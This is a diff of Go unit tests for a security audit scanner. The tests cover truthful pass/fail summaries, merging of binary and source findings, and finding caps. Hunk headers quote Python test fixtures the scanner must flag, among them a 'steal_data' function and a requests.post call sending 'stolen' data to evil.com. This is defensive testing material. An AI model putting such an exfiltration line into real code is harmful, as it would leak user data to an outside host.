@@ -335,6 +335,35 @@ func TestAssembleAuditReport_SummaryHonestyAndFailClosed(t *testing.T) {
 	}
 }
 
+// TestBuildSummaryTextDoesNotClaimAPassWhenRefused pins the branch where the
+// conclusion withholds the pass although no finding was produced. That input is
+// reachable - an enabled binary channel that could not scan a file records the
+// gap without emitting a finding, so Statistics.Total() stays 0 while
+// ProvesCleanScan returns false and the conclusion refuses - and the summary must
+// not then tell the platform the code passed, because the platform refuses the
+// import on conclusion.passed and reads this text as the human reason.
+func TestBuildSummaryTextDoesNotClaimAPassWhenRefused(t *testing.T) {
+	refused := buildSummaryTextExt(AuditStatistics{}, "NONE", false, false, true)
+
+	// The claim that was broken: an empty finding list is not a pass when the
+	// scan did not look everywhere.
+	if strings.Contains(refused, "通过审计") {
+		t.Errorf("refused summary claims a pass: %q", refused)
+	}
+	// Pin the message that replaced it, on the phrase that states the reason
+	// rather than the whole sentence.
+	if !strings.Contains(refused, "未覆盖全部内容") {
+		t.Errorf("refused summary does not state that the audit did not cover everything: %q", refused)
+	}
+
+	// The pass branch is unchanged: zero findings with passed true is still the
+	// clean statement the platform has always received.
+	clean := buildSummaryTextExt(AuditStatistics{}, "NONE", true, false, true)
+	if clean != "未发现安全问题，代码通过审计" {
+		t.Errorf("clean summary = %q, want 未发现安全问题，代码通过审计", clean)
+	}
+}
+
 // ── GenerateAuditReport end-to-end tests ─────────────────
 
 func TestGenerateAuditReportCleanCode(t *testing.T) {
@@ -352,7 +381,7 @@ class Model(nn.Module):
 `)
 
 	cfg := LLMConfig{Enabled: false}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -392,7 +421,7 @@ def steal_data(data):
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -428,7 +457,7 @@ requests.post("http://example.com", json={"key": "value"})
 `)
 
 	cfg := LLMConfig{Enabled: false}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -470,7 +499,7 @@ requests.post("http://evil.com", data="stolen")
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "test-model", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -484,7 +513,7 @@ requests.post("http://evil.com", data="stolen")
 }
 
 func TestGenerateAuditReportEmptyDir(t *testing.T) {
-	_, err := GenerateAuditReport(context.Background(), "", DefaultEngine(), LLMConfig{}, nil)
+	_, err := GenerateAuditReport(context.Background(), "", DefaultEngine(), AuditConfig{LLM: LLMConfig{}}, nil)
 	if err == nil {
 		t.Fatal("expected error for empty dir")
 	}
@@ -578,7 +607,7 @@ requests.post("http://monitor.local/metrics", json={"acc": 0.95})
 	}
 
 	cfg := LLMConfig{Enabled: true, Model: "qwen2.5-coder:0.5b", Policy: "gate", MaxFindings: 10}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{LLM: cfg}, mock)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -839,4 +868,234 @@ func TestFileReportOrderIsTotalAndRunIndependent(t *testing.T) {
 				"path so the output does not depend on map iteration order", order, got, want)
 		}
 	}
+}
+
+// TestMergeBinaryFindingsAppendsAndRecomputes pins the three things the merge
+// does at once: the binary findings join the list, the static counts are
+// recomputed from the joined list, and the binary summary is attached *before*
+// that recomputation so that ProvesCleanScan reads it.
+//
+// The fixture is built so the last assertion can fail. Both findings are MEDIUM,
+// which under the default `assist` policy does not block, so the report passes
+// before the merge and would still pass after it if the summary arrived too late
+// - the only thing that can withdraw the pass is BoundedExecutable, and only if
+// the summary was there when recomputeReportPassed ran. A fixture with a HIGH in
+// it would hold this assertion whichever order the merge used, and would pin
+// nothing.
+func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
+	report := &Report{
+		ScanComplete: true,
+		FilesCount:   1,
+		Findings: []Finding{
+			{File: "/m/clean.py", Line: 1, RuleID: "ENV_001", Severity: SeverityMedium},
+		},
+	}
+	recomputeReportPassed(report, false)
+	if !report.Passed {
+		t.Fatal("fixture is wrong: a MEDIUM-only report passes under assist")
+	}
+	if report.MediumCount != 1 {
+		t.Fatalf("fixture is wrong: MediumCount = %d, want 1", report.MediumCount)
+	}
+
+	res := &BinaryScanResult{
+		Claimed: []string{"/m/libevil.so"},
+		Findings: []Finding{
+			{File: "/m/libevil.so", Line: 4, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
+		},
+		Summary: BinaryScanSummary{FilesCount: 1, BoundedExecutable: 1},
+	}
+
+	MergeBinaryFindings(report, res)
+
+	if len(report.Findings) != 2 {
+		t.Fatalf("len(Findings) = %d, want 2", len(report.Findings))
+	}
+	if !containsFileFinding(report.Findings, "/m/libevil.so", "DYN_001") {
+		t.Error("the binary finding did not join the list")
+	}
+	if report.Binary == nil {
+		t.Fatal("report.Binary is nil; the completeness summary did not reach the report")
+	}
+	if report.MediumCount != 2 {
+		t.Errorf("MediumCount = %d, want 2: the counts were not recomputed from the joined list", report.MediumCount)
+	}
+	if report.Passed {
+		t.Error("Passed = true: the summary was attached after the recomputation, so ProvesCleanScan never saw BoundedExecutable")
+	}
+}
+
+// TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles pins the cross-channel
+// case. A binary file named .py is read by the source arm as text, and the lines
+// it produces are a reading of bytes that are not text. Keeping both would report
+// garbage alongside the evidence, and would let a crafted file pad its own audit
+// with findings that mean nothing.
+func TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles(t *testing.T) {
+	report := &Report{
+		ScanComplete: true,
+		Findings: []Finding{
+			{File: "/m/evil.py", Line: 12, RuleID: "CMD_001", Severity: SeverityHigh},
+			{File: "/m/clean.py", Line: 3, RuleID: "CMD_001", Severity: SeverityHigh},
+		},
+	}
+	res := &BinaryScanResult{
+		Claimed: []string{"/m/evil.py"},
+		Findings: []Finding{
+			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityHigh, Engine: EngineNameBinary},
+		},
+	}
+
+	MergeBinaryFindings(report, res)
+
+	var files []string
+	for _, f := range report.Findings {
+		files = append(files, f.File+":"+f.RuleID)
+	}
+	if len(report.Findings) != 2 {
+		t.Fatalf("findings = %v, want the text reading of evil.py replaced by the binary one", files)
+	}
+	for _, f := range report.Findings {
+		if f.File == "/m/evil.py" && f.Engine != EngineNameBinary {
+			t.Errorf("a text finding on a binary file survived: %s:%s", f.File, f.RuleID)
+		}
+	}
+	if !containsFileFinding(report.Findings, "/m/clean.py", "CMD_001") {
+		t.Error("a finding on a plain source file was dropped; the filter is too wide")
+	}
+}
+
+// TestMergeBinaryFindingsDropsTextFindingsAcrossPathSpellings pins the cleanAbs
+// normalisation on both sides of the claim test.
+//
+// The two arms do not have to spell the same file the same way: ScanDirectory
+// hands back the path it walked, while the source arm's findings carry the path
+// its own walk produced. Both paths in the fixture are absolute so nothing here
+// depends on the process CWD, and the claimed one carries a redundant component,
+// so a plain string comparison keeps the text finding beside the binary one.
+func TestMergeBinaryFindingsDropsTextFindingsAcrossPathSpellings(t *testing.T) {
+	report := &Report{
+		ScanComplete: true,
+		Findings: []Finding{
+			{File: "/m/evil.py", Line: 12, RuleID: "CMD_001", Severity: SeverityHigh},
+		},
+	}
+	res := &BinaryScanResult{
+		Claimed: []string{"/m/./evil.py"},
+		Findings: []Finding{
+			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityHigh, Engine: EngineNameBinary},
+		},
+	}
+
+	MergeBinaryFindings(report, res)
+
+	for _, f := range report.Findings {
+		if f.Engine != EngineNameBinary && f.File == "/m/evil.py" {
+			t.Errorf("the text reading of %q survived the claim on %q: both sides of the "+
+				"claim test have to go through cleanAbs", f.File, res.Claimed[0])
+		}
+	}
+	if !containsFileFinding(report.Findings, "/m/evil.py", "BIN_001") {
+		t.Error("the binary finding is missing; the fixture is wrong")
+	}
+	if len(report.Findings) != 1 {
+		t.Errorf("len(Findings) = %d, want 1: the text reading was not replaced by the binary one", len(report.Findings))
+	}
+}
+
+// TestMergeBinaryFindingsKeepsBothChannelsFindings pins that the merge does not
+// apply a ceiling to the joined list.
+//
+// Each channel caps its own findings before the merge. A second cap here would
+// couple them: it would choose which findings to drop by path order rather than
+// by importance, and it would let a large source arm evict the binary findings
+// entirely. The fixture holds three source findings and one binary finding, so
+// the length assertion below rules out a merge-side ceiling that kept three of
+// the four - not a ceiling in general: a cap of four or more would leave the
+// joined list at four and still pass.
+//
+// The binary finding is DYN_001/MEDIUM rather than a blocked-family HIGH,
+// because the pass assertion below has to survive the merge: what this test
+// pins is the length of the joined list, and a HIGH binary finding would
+// withdraw the pass on its own, making that assertion a statement about
+// severity instead of about capping. MEDIUM does not block under `assist`, so
+// the merge's own recomputation leaves the report passing and a future change
+// that dropped a joined finding shows up as a shorter list.
+func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
+	report := &Report{ScanComplete: true, FilesCount: 3}
+	for i := 0; i < 3; i++ {
+		report.Findings = append(report.Findings, Finding{
+			File: "/m/a.py", Line: i + 1, RuleID: "CMD_001", Severity: SeverityMedium,
+		})
+	}
+	res := &BinaryScanResult{
+		Findings: []Finding{
+			{File: "/m/z.so", Line: 1, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
+		},
+		Summary: BinaryScanSummary{FilesCount: 2},
+	}
+
+	MergeBinaryFindings(report, res)
+
+	if len(report.Findings) != 4 {
+		t.Errorf("len(Findings) = %d, want 4: the merge applied a ceiling to the joined list", len(report.Findings))
+	}
+	// The fourth has to be the binary one: a length check alone would also hold
+	// if the merge had dropped a source finding and kept the binary one in its
+	// place.
+	if !containsFileFinding(report.Findings, "/m/z.so", "DYN_001") {
+		t.Error("the binary finding is not in the joined list")
+	}
+	if report.Truncated {
+		t.Error("Truncated = true: the merge re-capped a list both arms had already capped")
+	}
+	if !report.Passed {
+		t.Error("Passed = false: the merge turned a package that passed into one that does not")
+	}
+	// Target.FilesScanned is copied from FilesCount, so the binary files have to
+	// be in it or the report contradicts its own scan_metadata.binary block.
+	if report.FilesCount != 5 {
+		t.Errorf("FilesCount = %d, want 5 (3 source + 2 binary)", report.FilesCount)
+	}
+}
+
+// TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated pins the decision
+// that keeps the cap from refusing an import.
+//
+// The binary arm's cap drops LOW findings and only LOW (see
+// BinaryScanner.ScanDirectory), and LOW blocks under neither policy, so it
+// cannot have dropped anything that would have blocked the import - but the
+// report's Truncated is a completeness flag
+// that ProvesCleanScan refuses on, and folding this into it would turn "the
+// channel found more than its listing budget" into "the channel did not look".
+// The drop is visible where it belongs: findings_capped and findings_dropped on
+// scan_metadata.binary.
+func TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated(t *testing.T) {
+	report := &Report{ScanComplete: true, ProcessExitCode: 0}
+	res := &BinaryScanResult{
+		Summary: BinaryScanSummary{FilesCount: 1, FindingsCapped: true, FindingsDropped: 7},
+	}
+
+	MergeBinaryFindings(report, res)
+
+	if report.Truncated {
+		t.Error("Truncated = true after the binary arm capped itself; the channel refused a package for finding too much")
+	}
+	if !report.Passed {
+		t.Error("Passed = false although a capped listing is not a completeness gap: the cap drops only LOW")
+	}
+	if report.Binary == nil || !report.Binary.FindingsCapped || report.Binary.FindingsDropped != 7 {
+		t.Errorf("the cap is not visible on scan_metadata.binary: %+v", report.Binary)
+	}
+	if !report.ProvesCleanScan() {
+		t.Error("ProvesCleanScan() = false for a capped-only binary summary")
+	}
+}
+
+func containsFileFinding(findings []Finding, file, rule string) bool {
+	for _, f := range findings {
+		if f.File == file && f.RuleID == rule {
+			return true
+		}
+	}
+	return false
 }
